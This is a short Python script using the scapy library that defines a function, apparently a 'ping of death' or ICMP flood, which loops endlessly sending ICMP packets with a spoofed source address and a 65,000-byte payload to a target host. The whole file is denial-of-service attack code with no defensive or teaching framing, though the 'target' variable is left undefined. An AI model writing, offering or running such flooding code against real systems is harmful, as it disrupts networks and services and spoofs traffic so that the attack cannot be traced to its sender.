from scapy.all import *

def pod():
    try:
        while True:
            src_addr = "10.0.1.1"
            ip_hdr = IP(src=src_addr, dst=target)
            packet = ip_hdr/ICMP()/("A"*65000)
            send(packet)
    except KeyboardInterrupt:
        print("\nKeyboard Interrupt!")
